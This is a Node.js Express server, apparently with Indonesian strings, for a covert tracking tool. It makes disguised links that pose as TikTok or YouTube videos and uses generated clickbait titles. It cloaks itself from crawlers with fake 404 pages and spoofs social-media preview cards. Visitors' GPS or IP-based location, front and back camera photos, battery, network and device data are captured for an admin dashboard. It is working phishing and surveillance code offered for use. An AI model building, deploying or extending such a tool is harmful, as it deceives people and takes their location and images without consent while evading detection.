// language: JavaScript, file: server.js, runtime: Node 18+
const express = require('express');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const cookieParser = require('cookie-parser');

const app = express();
app.set('trust proxy', true);
app.use(express.json({ limit: '25mb' }));
app.use(cookieParser());

const PORT = process.env.PORT || 12044;
const HOST = '0.0.0.0';

const ADMIN_USER = process.env.ADMIN_USER || 'admin';
const ADMIN_PASS = process.env.ADMIN_PASS || 'admin';
const SESSION_SECRET = process.env.SESSION_SECRET || crypto.randomBytes(32).toString('hex');
const SESSION_MAX_AGE = 8 * 3600 * 1000;

const LOGIN_WINDOW_MS = 15 * 60 * 1000;
const LOGIN_MAX = 5;
const COLLECT_WINDOW_MS = 60 * 1000;
const COLLECT_MAX = 10;
const loginAttempts = new Map();
const collectAttempts = new Map();

function rateLimit(map, key, windowMs, max) {
  const now = Date.now();
  const rec = map.get(key) || { count: 0, reset: now + windowMs };
  if (now > rec.reset) { rec.count = 0; rec.reset = now + windowMs; }
  if (rec.count >= max) return { allowed: false, retry: Math.ceil((rec.reset - now) / 1000) };
  rec.count++;
  map.set(key, rec);
  return { allowed: true };
}

function getClientIp(req) {
  return (req.headers['x-forwarded-for'] || '').split(',')[0].trim() || req.socket.remoteAddress || 'unknown';
}

const DATA_DIR = path.join(__dirname, 'data');
const UPLOAD_DIR = path.join(DATA_DIR, 'uploads');
if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
if (!fs.existsSync(UPLOAD_DIR)) fs.mkdirSync(UPLOAD_DIR, { recursive: true });
const CAPTURES_FILE = path.join(DATA_DIR, 'captures.jsonl');
const LINKS_FILE = path.join(DATA_DIR, 'links.json');

function signToken(payload) {
  const body = Buffer.from(JSON.stringify(payload)).toString('base64url');
  const sig = crypto.createHmac('sha256', SESSION_SECRET).update(body).digest('base64url');
  return body + '.' + sig;
}
function verifyToken(token) {
  if (!token || typeof token !== 'string') return null;
  const [body, sig] = token.split('.');
  if (!body || !sig) return null;
  const expect = crypto.createHmac('sha256', SESSION_SECRET).update(body).digest('base64url');
  const a = Buffer.from(sig);
  const b = Buffer.from(expect);
  if (a.length !== b.length) return null;
  if (!crypto.timingSafeEqual(a, b)) return null;
  try {
    const payload = JSON.parse(Buffer.from(body, 'base64url').toString());
    if (payload.exp && Date.now() > payload.exp) return null;
    return payload;
  } catch { return null; }
}
function setSession(res, user) {
  const token = signToken({ user, exp: Date.now() + SESSION_MAX_AGE });
  res.cookie('ct_session', token, {
    httpOnly: true, sameSite: 'lax', secure: process.env.NODE_ENV === 'production', maxAge: SESSION_MAX_AGE, path: '/'
  });
}
function requireAuth(req, res, next) {
  const p = verifyToken(req.cookies?.ct_session);
  if (!p) {
    if (req.path.startsWith('/api/')) return res.status(401).json({ error: 'unauthorized' });
    return res.redirect('/login');
  }
  req.user = p.user;
  next();
}

function readLinks() { try { return JSON.parse(fs.readFileSync(LINKS_FILE, 'utf8')); } catch { return {}; } }
function saveLinks(o) { fs.writeFileSync(LINKS_FILE, JSON.stringify(o, null, 2)); }
function appendCapture(e) { fs.appendFileSync(CAPTURES_FILE, JSON.stringify(e) + '\n'); }
function readCaptures() {
  try {
    return fs.readFileSync(CAPTURES_FILE, 'utf8').trim().split('\n').filter(Boolean)
      .map(l => { try { return JSON.parse(l); } catch { return null; } }).filter(Boolean);
  } catch { return []; }
}
function writeCaptures(arr) {
  fs.writeFileSync(CAPTURES_FILE, arr.map(c => JSON.stringify(c)).join('\n') + (arr.length ? '\n' : ''));
}
function saveDataUrl(dataUrl, filename) {
  if (!dataUrl || typeof dataUrl !== 'string') return null;
  const m = dataUrl.match(/^data:image\/(jpeg|jpg|png|webp);base64,(.+)$/i);
  if (!m) return null;
  const buf = Buffer.from(m[2], 'base64');
  if (buf.length > 6 * 1024 * 1024) return null;
  fs.writeFileSync(path.join(UPLOAD_DIR, filename), buf);
  return '/data/uploads/' + filename;
}
function deleteFileIfExists(p) {
  if (!p || typeof p !== 'string') return;
  if (!p.startsWith('/data/uploads/')) return;
  const f = path.join(__dirname, p.replace(/^\//, ''));
  try { if (fs.existsSync(f)) fs.unlinkSync(f); } catch {}
}

const HARD_BOT = /(googlebot|bingbot|yandexbot|duckduckbot|baiduspider|slurp|curl|wget|python-requests|axios\/|go-http-client|java\/|okhttp|bingpreview|ahrefsbot|semrushbot|mj12bot|dotbot|petalbot|applebot|gptbot|claudebot|perplexitybot|ccbot|bytespider)/i;
const PREVIEW_BOT = /(facebookexternalhit|whatsapp|telegrambot|slackbot|discordbot|twitterbot|linkedinbot|embedly|skypeuripreview)/i;
function detectBot(ua) {
  if (!ua) return 'hard';
  if (HARD_BOT.test(ua)) return 'hard';
  if (PREVIEW_BOT.test(ua)) return 'preview';
  return 'human';
}

function generateClickbait(baseTitle, platform) {
  const emojis = ['🔥', '😱', '🚨', '⚠️', '😭', '🤯', '👀', '💥'];
  const hooks = [
    'Jangan sampai ketinggalan!', 'Video ini bikin geger!', 'Kamu pasti nyesel kalau skip!',
    'Cek sebelum dihapus!', 'Fakta mencengangkan!', 'Konten ini viral banget!', 'Netizen ramai membahas ini!'
  ];
  const cleanTitle = String(baseTitle || 'Video').replace(/\s*-\s*YouTube\s*$/i, '').trim();
  const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];
  const randomHook = hooks[Math.floor(Math.random() * hooks.length)];
  
  let newTitle = `${randomHook} ${cleanTitle} ${randomEmoji}`;
  if (newTitle.length > 90) newTitle = newTitle.substring(0, 87) + '...';

  let newDesc = '';
  if (platform === 'tiktok') {
    newDesc = `Tonton sampai habis! ${cleanTitle}. Klik link untuk melihat secara penuh sebelum video ini dihapus oleh kreator.`;
  } else {
    newDesc = `Video yang sedang ramai dibicarakan! ${cleanTitle}. Tonton sekarang sebelum videonya di-takedown.`;
  }
  if (newDesc.length > 150) newDesc = newDesc.substring(0, 147) + '...';

  return { title: newTitle, desc: newDesc };
}

async function fetchOEmbed(url) {
  try {
    const r = await fetch('https://www.tiktok.com/oembed?url=' + encodeURIComponent(url), {
      headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
      signal: AbortSignal.timeout(8000)
    });
    if (!r.ok) return null;
    const d = await r.json();
    if (!d.thumbnail_url) return null;
    return { thumb: d.thumbnail_url, user: d.author_name || '', avatar: d.author_url || '', caption: d.title || '', desc: '', platform: 'tiktok' };
  } catch { return null; }
}
async function fetchTikWM(url) {
  try {
    const r = await fetch('https://www.tikwm.com/api/?url=' + encodeURIComponent(url), {
      signal: AbortSignal.timeout(8000)
    });
    if (!r.ok) return null;
    const j = await r.json();
    if (!j || j.code !== 0 || !j.data) return null;
    return {
      thumb: j.data.cover || j.data.origin_cover || '',
      user: j.data.author?.unique_id || 'user',
      avatar: j.data.author?.avatar || '',
      caption: j.data.title || 'TikTok Video',
      desc: j.data.title || '',
      platform: 'tiktok'
    };
  } catch { return null; }
}
async function fetchYouTube(url) {
  try {
    const matchVideo = url.match(/(?:youtu\.be\/|youtube\.com\/(?:shorts\/|watch\?v=|embed\/|v\/))([\w-]{11})/);

    if (matchVideo) {
      const videoId = matchVideo[1];

      const r = await fetch('https://www.youtube.com/oembed?url=https://www.youtube.com/watch?v=' + videoId + '&format=json', {
        headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' },
        signal: AbortSignal.timeout(8000)
      });
      if (!r.ok) return null;
      const d = await r.json();

      const thumbCandidates = [
        'https://img.youtube.com/vi/' + videoId + '/maxresdefault.jpg',
        'https://img.youtube.com/vi/' + videoId + '/sddefault.jpg',
        'https://img.youtube.com/vi/' + videoId + '/hqdefault.jpg',
        'https://img.youtube.com/vi/' + videoId + '/mqdefault.jpg'
      ];
      let thumb = thumbCandidates[thumbCandidates.length - 1];
      for (const candidate of thumbCandidates) {
        try {
          const headRes = await fetch(candidate, { method: 'HEAD', signal: AbortSignal.timeout(4000) });
          if (headRes.ok) { thumb = candidate; break; }
        } catch (e) {}
      }

      let user = d.author_name || 'YouTube';
      let avatar = 'data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIzNSIgaGVpZ2h0PSIzNSIgdmlld2JveD0iMCAwIDM1IDM1Ij48Y2lyY2xlIGN4PSIxNy41IiBjeT0iMTcuNSIgcj0iMTcuNSIgZmlsbD0iIzMzMyIvPjx0ZXh0IHg9IjE3LjUiIHk9IjIyIiBmb250LXNpemU9IjE0IiBmaWxsPSIjZmZmIiB0ZXh0LWFuY2hvcj0ibWlkZGxlIj5APC90ZXh0Pjwvc3ZnPg==';

      if (d.author_url) {
        const handleMatch = d.author_url.match(/youtube\.com\/@([\w.\-]+)/i);
        if (handleMatch) user = '@' + handleMatch[1];
        
        try {
          const channelRes = await fetch(d.author_url, {
            headers: {
              'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
              'Accept-Language': 'en-US,en;q=0.9'
            },
            signal: AbortSignal.timeout(5000)
          });
          if (channelRes.ok) {
            const channelHtml = await channelRes.text();
            const ogImgMatch = channelHtml.match(/<meta\s+property="og:image"\s+content="([^"]+)"/i);
            if (ogImgMatch && ogImgMatch[1]) {
              avatar = ogImgMatch[1].replace(/=s\d+.*$/, '=s176-c-k-c0x00ffffff-no-rj');
            }
          }
        } catch (e) {}
      }

      let caption = d.title || 'YouTube Video';
      caption = caption.replace(/\s*-\s*YouTube\s*$/i, '').trim();

      let desc = '';
      try {
        const pageRes = await fetch('https://www.youtube.com/watch?v=' + videoId + '&hl=id', {
          headers: {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept-Language': 'id-ID,id;q=0.9,en;q=0.8'
          },
          signal: AbortSignal.timeout(8000)
        });
        if (pageRes.ok) {
          const html = await pageRes.text();
          const descMatch = html.match(/"shortDescription":"((?:[^"\\]|\\.)*)"/);
          if (descMatch) {
            desc = descMatch[1]
              .replace(/\\n/g, '\n')
              .replace(/\\"/g, '"')
              .replace(/\\\//g, '/')
              .replace(/\\u([0-9a-fA-F]{4})/g, (_, grp) => String.fromCharCode(parseInt(grp, 16)));
            try { desc = decodeURIComponent(escape(desc)); } catch (e) {}
            if (desc.length > 280) desc = desc.substring(0, 277) + '...';
          }

          if (avatar.includes('data:image')) {
            const channelIdMatch = html.match(/"channelId":"(UC[\w-]+)"/);
            if (channelIdMatch) {
              avatar = 'https://yt3.ggpht.com/ytc/' + channelIdMatch[1] + '=s176-c-k-c0x00ffffff-no-rj';
            }
          }
        }
      } catch (e) {}

      return { thumb, user, avatar, caption, desc: desc || caption, platform: 'youtube' };
    }

    if (/youtube\.com\/(@|channel\/|c\/)/i.test(url)) {
      const r = await fetch(url, {
        headers: {
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
          'Accept-Language': 'id-ID,id;q=0.9'
        },
        signal: AbortSignal.timeout(8000)
      });
      if (!r.ok) return null;
      const html = await r.text();

      const thumbMatch = html.match(/<meta\s+property="og:image"\s+content="([^"]+)"/i);
      const titleMatch = html.match(/<meta\s+property="og:title"\s+content="([^"]+)"/i);
      const descMatch = html.match(/<meta\s+property="og:description"\s+content="([^"]+)"/i);

      let thumb = thumbMatch ? thumbMatch[1].replace(/&amp;/g, '&') : '';
      let caption = titleMatch ? titleMatch[1].replace(/&amp;/g, '&') : 'YouTube Channel';
      let desc = descMatch ? descMatch[1].replace(/&amp;/g, '&') : '';

      let user = 'Channel';
      let avatar = '';
      const handleMatch = url.match(/youtube\.com\/@([\w.\-]+)/i);
      if (handleMatch) user = '@' + handleMatch[1];

      if (thumb) return { thumb, user, avatar, caption, desc: desc || caption, platform: 'youtube' };
    }
    return null;
  } catch { return null; }
}

async function lookupIp(ip) {
  try {
    const r = await fetch('https://ipwho.is/' + encodeURIComponent(ip), { signal: AbortSignal.timeout(5000) });
    const d = await r.json();
    if (d && d.success && typeof d.latitude === 'number') {
      return { lat: d.latitude, lng: d.longitude, acc: 5000, city: d.city || '', provider: 'ipwho.is' };
    }
  } catch {}
  try {
    const r = await fetch('https://ipapi.co/' + encodeURIComponent(ip) + '/json/', {
      headers: { 'User-Agent': 'curl/8.0' },
      signal: AbortSignal.timeout(5000)
    });
    const d = await r.json();
    if (d && !d.error && typeof d.latitude === 'number') {
      return { lat: d.latitude, lng: d.longitude, acc: 5000, city: d.city || '', provider: 'ipapi.co' };
    }
  } catch {}
  try {
    const r = await fetch('http://ip-api.com/json/' + encodeURIComponent(ip) + '?fields=status,lat,lon,city', { signal: AbortSignal.timeout(5000) });
    const d = await r.json();
    if (d && d.status === 'success') {
      return { lat: d.lat, lng: d.lon, acc: 5000, city: d.city || '', provider: 'ip-api.com' };
    }
  } catch {}
  return null;
}

app.post('/api/login', (req, res) => {
  const ip = getClientIp(req);
  const rl = rateLimit(loginAttempts, ip, LOGIN_WINDOW_MS, LOGIN_MAX);
  if (!rl.allowed) return res.status(429).json({ error: 'Terlalu banyak percobaan. Coba lagi dalam ' + rl.retry + ' detik.' });
  const { user, pass } = req.body || {};
  if (user !== ADMIN_USER || pass !== ADMIN_PASS) return res.status(401).json({ error: 'Username/Password salah' });
  loginAttempts.delete(ip);
  setSession(res, user);
  res.json({ ok: true });
});

app.post('/api/logout', (req, res) => {
  res.clearCookie('ct_session', { path: '/' });
  res.json({ ok: true });
});

app.get('/api/me', requireAuth, (req, res) => res.json({ ok: true, user: req.user }));

app.get('/api/links', requireAuth, (req, res) => {
  const links = readLinks();
  const list = Object.keys(links).map(id => ({ id, ...links[id] }));
  list.sort((a, b) => new Date(b.created) - new Date(a.created));
  res.json(list);
});

app.delete('/api/links', requireAuth, (req, res) => {
  try {
    saveLinks({});
    res.json({ ok: true });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.delete('/api/links/:id', requireAuth, (req, res) => {
  const links = readLinks();
  if (links[req.params.id]) {
    delete links[req.params.id];
    saveLinks(links);
    res.json({ ok: true });
  } else {
    res.status(404).json({ error: 'Link tidak ditemukan' });
  }
});

app.post('/api/link', requireAuth, async (req, res) => {
  try {
    let { tiktokUrl, customTitle, customDesc } = req.body || {};
    if (!tiktokUrl) return res.status(400).json({ error: 'URL tidak boleh kosong' });

    const isYT = /youtu(be\.com|\.be)/i.test(tiktokUrl);
    const isTT = /tiktok\.com/i.test(tiktokUrl);

    if (!isYT && !isTT) {
      return res.status(400).json({ error: 'Hanya mendukung URL TikTok dan YouTube' });
    }

    const cleanUrl = tiktokUrl.split('?')[0];
    let meta = null;

    if (isTT) {
      meta = await fetchOEmbed(cleanUrl);
      if (!meta) meta = await fetchTikWM(cleanUrl);
    } else if (isYT) {
      meta = await fetchYouTube(cleanUrl);
    }

    if (!meta) meta = { thumb: '', user: 'user', avatar: '', caption: 'Video', desc: 'Video', platform: isYT ? 'youtube' : 'tiktok' };

    meta.thumbDisplay = meta.thumb || '';
    
    if (!customTitle || !customDesc) {
      const autoGen = generateClickbait(meta.caption || 'Video Viral', meta.platform);
      if (!customTitle) meta.ogTitle = autoGen.title;
      if (!customDesc)  meta.ogDesc = autoGen.desc;
    }
    
    if (customTitle) meta.ogTitle = String(customTitle).slice(0, 100);
    if (customDesc) meta.ogDesc = String(customDesc).slice(0, 200);

    const id = crypto.randomBytes(4).toString('hex');
    const links = readLinks();
    links[id] = {
      tiktokUrl: cleanUrl,
      meta,
      created: new Date().toISOString(),
      hits: 0
    };
    saveLinks(links);

    const proto = (req.headers['x-forwarded-proto'] || req.protocol || 'http').split(',')[0];
    const host = req.headers['x-forwarded-host'] || req.headers.host;
    const origin = proto + '://' + host;

    const cacheBuster = '?v=' + Math.random().toString(36).substring(2, 7);
    const finalUrl = origin + '/v/' + id + cacheBuster;

    res.json({ ok: true, phishUrl: finalUrl, meta });
  } catch (err) {
    console.error('[api/link error]', err);
    res.status(500).json({ error: 'Gagal memproses link: ' + err.message });
  }
});

app.post('/api/collect', async (req, res) => {
  try {
    const ip = getClientIp(req);

    const rl = rateLimit(collectAttempts, ip, COLLECT_WINDOW_MS, COLLECT_MAX);
    if (!rl.allowed) return res.status(429).json({ error: 'rate limited', retry: rl.retry });

    const token = req.headers['x-collect-token'] || req.body.collect_token;
    const payload = verifyToken(token);
    if (!payload || !payload.linkId || !payload.exp || Date.now() > payload.exp) {
      return res.status(401).json({ error: 'invalid token' });
    }
    const linksCheck = readLinks();
    if (!linksCheck[payload.linkId]) {
      return res.status(401).json({ error: 'link not found' });
    }

    const remoteIp = req.socket.remoteAddress || '';

    let loc = req.body.loc;
    if (typeof loc === 'string') {
      try { loc = JSON.parse(loc); } catch(e) { loc = null; }
    }

    let locType = 'GPS';

    if (!loc || loc.lat === undefined || loc.lng === undefined || isNaN(Number(loc.lat)) || isNaN(Number(loc.lng))) {
      loc = null;
      locType = 'IP';
      const lookup = await lookupIp(ip);
      if (lookup) loc = lookup;
    } else {
      loc = { lat: Number(loc.lat), lng: Number(loc.lng), acc: Number(loc.acc) || 0 };
    }

    const capId = (req.body.id && String(req.body.id).replace(/[^a-z0-9\-]/gi, '').slice(0, 24)) || crypto.randomBytes(6).toString('hex');
    const ts = Date.now();
    const frontPath = saveDataUrl(req.body.photo_front, capId + '_front.jpg');
    const backPath = saveDataUrl(req.body.photo_back, capId + '_back.jpg');

    appendCapture({
      id: capId,
      ts,
      ip,
      remoteIp,
      loc,
      locType,
      battery: req.body.battery || null,
      network: req.body.network || null,
      ua: req.body.ua || '',
      photo_front: frontPath,
      photo_back: backPath
    });
    res.json({ ok: true });
  } catch (err) {
    console.error('[api/collect error]', err);
    res.status(500).json({ error: err.message });
  }
});

app.get('/api/captures', requireAuth, (req, res) => res.json(readCaptures()));

app.delete('/api/captures/:id', requireAuth, (req, res) => {
  try {
    const all = readCaptures();
    const target = all.find(c => c.id === req.params.id);
    if (target) { deleteFileIfExists(target.photo_front); deleteFileIfExists(target.photo_back); }
    writeCaptures(all.filter(c => c.id !== req.params.id));
    res.json({ ok: true });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.delete('/api/captures', requireAuth, (req, res) => {
  try {
    const all = readCaptures();
    for (const c of all) { deleteFileIfExists(c.photo_front); deleteFileIfExists(c.photo_back); }
    writeCaptures([]);
    res.json({ ok: true });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});

app.get('/thumb/:id', async (req, res) => {
  try {
    const links = readLinks();
    const l = links[req.params.id];
    if (!l || !l.meta || !l.meta.thumb) return res.status(404).end();

    const url = l.meta.thumb;
    const reqHeaders = {
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
      'Accept': 'image/avif,image/webp,image/apng,image/*,*/*;q=0.8'
    };
    if (/tiktokcdn|tiktok\.com/i.test(url)) reqHeaders['Referer'] = 'https://www.tiktok.com/';

    const r = await fetch(url, { headers: reqHeaders, signal: AbortSignal.timeout(8000) });
    if (!r.ok) return res.status(404).end();

    res.setHeader('Content-Type', r.headers.get('content-type') || 'image/jpeg');
    res.setHeader('Cache-Control', 'public, max-age=86400');
    const buf = Buffer.from(await r.arrayBuffer());
    res.send(buf);
  } catch (e) {
    res.status(404).end();
  }
});

app.get('/v/:id', (req, res) => {
  const links = readLinks();
  const l = links[req.params.id];
  if (!l) return res.status(404).send('Link tidak valid');

  const bot = detectBot(req.headers['user-agent'] || '');

  if (bot === 'hard') {
    return res.status(404).type('html').send('<!DOCTYPE html><html><head><meta charset="utf-8"><title>404 Not Found</title></head><body style="font-family:sans-serif;text-align:center;padding:50px;background:#000;color:#fff;"><h1>404</h1><p>Halaman tidak ditemukan.</p></body></html>');
  }

  l.hits = (l.hits || 0) + 1;
  saveLinks(links);

  const m = l.meta || {};
  const isYT = m.platform === 'youtube';
  const targetUrl = l.tiktokUrl;
  
  const logoUrl = isYT ? 'https://www.youtube.com/favicon.ico' : 'https://www.tiktok.com/favicon.ico';
  const siteName = isYT ? 'YouTube' : 'TikTok';
  const siteUrl = isYT ? 'https://youtube.com' : 'https://www.tiktok.com/';

  if (bot === 'preview') {
    const esc = s => String(s || '').replace(/[<>&"']/g, c => ({ '<': '&lt;', '>': '&gt;', '&': '&amp;', '"': '&quot;', "'": '&#39;' }[c]));
    const finalTitle = m.ogTitle || m.caption || 'Video';
    const finalDesc = m.ogDesc || m.desc || m.caption || 'Video';

    const proto = (req.headers['x-forwarded-proto'] || req.protocol || 'http').split(',')[0];
    const host = req.headers['x-forwarded-host'] || req.headers.host;
    const originalThumb = proto + '://' + host + '/thumb/' + req.params.id;

    // MENGGUNAKAN WSRV.NL UNTUK MEMAKSA RASIO 1080x1920 (9:16)
    const proxyThumb = 'https://wsrv.nl/?url=' + encodeURIComponent(originalThumb) + '&w=1080&h=1920&fit=cover&output=jpg';

    return res.status(200).type('html').send(`<!DOCTYPE html><html><head>
<meta charset="utf-8">
<title>${esc(finalTitle)}</title>
<link rel="icon" type="image/png" href="${logoUrl}">
<meta property="og:type" content="video.other">
<meta property="og:site_name" content="${siteName}">
<meta property="og:url" content="${siteUrl}">
<meta property="og:title" content="${esc(finalTitle)}">
<meta property="og:description" content="${esc(finalDesc)}">
<meta property="og:image" content="${proxyThumb}">
<meta property="og:image:secure_url" content="${proxyThumb}">
<meta property="og:image:width" content="1080">
<meta property="og:image:height" content="1920">
<meta property="og:image:type" content="image/jpeg">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:title" content="${esc(finalTitle)}">
<meta name="twitter:description" content="${esc(finalDesc)}">
<meta name="twitter:image" content="${proxyThumb}">
</head><body></body></html>`);
  }

  const collectToken = signToken({ linkId: req.params.id, exp: Date.now() + 3600_000 });

  const escAttr = s => String(s || '').replace(/[<>"'&]/g, c => ({ '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;', '&': '&amp;' }[c]));
  const thumb = '/thumb/' + req.params.id;

  const viewFile = isYT ? 'yt.html' : 'vt.html';
  const viewPath = path.join(__dirname, 'views', viewFile);
  
  try {
    let template = fs.readFileSync(viewPath, 'utf8');
    
    template = template
      .replace(/\{\{TITLE\}\}/g, escAttr(m.caption || 'Video'))
      .replace(/\{\{USER\}\}/g, escAttr(m.user || (isYT ? 'Channel' : 'user')))
      .replace(/\{\{CAPTION\}\}/g, escAttr(m.caption || 'Video'))
      .replace(/\{\{AVATAR\}\}/g, escAttr(m.avatar || ''))
      .replace(/\{\{THUMB\}\}/g, thumb)
      .replace(/\{\{TARGET_URL\}\}/g, targetUrl)
      .replace(/\{\{COLLECT_TOKEN\}\}/g, collectToken)
      .replace(/\{\{LINK_ID\}\}/g, escAttr(req.params.id));

    res.send(template);
  } catch (e) {
    console.error('[view error]', e);
    res.status(500).send('Internal Server Error');
  }
});

app.get('/login', (req, res) => {
  if (verifyToken(req.cookies?.ct_session)) return res.redirect('/admin');
  res.sendFile(path.join(__dirname, 'public', 'login.html'));
});
app.get('/admin', requireAuth, (req, res) => res.sendFile(path.join(__dirname, 'public', 'admin.html')));
app.get('/dashboard', requireAuth, (req, res) => res.sendFile(path.join(__dirname, 'public', 'dashboard.html')));
app.get('/', (req, res) => {
  if (verifyToken(req.cookies?.ct_session)) return res.redirect('/admin');
  res.redirect('/login');
});

app.use('/data/uploads', requireAuth, express.static(UPLOAD_DIR, { index: false }));

app.listen(PORT, HOST, () => console.log('[listen] ' + HOST + ':' + PORT));